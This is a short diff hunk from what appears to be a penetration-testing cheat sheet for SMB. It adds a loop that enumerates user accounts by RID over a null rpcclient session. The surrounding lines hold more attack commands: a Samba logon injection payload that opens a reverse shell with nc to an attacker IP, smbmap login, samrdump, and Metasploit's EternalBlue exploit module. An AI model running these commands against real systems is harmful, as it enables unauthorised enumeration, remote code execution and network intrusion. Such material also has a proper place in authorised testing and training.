@@ -186,6 +186,7 @@ $ smbmap -H <IP address> -u <username> -p <password>
 smb: \> !ls
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 $ rpcclient -U "" <IP address>
+$ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
 $ samrdump.py <IP address>	
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
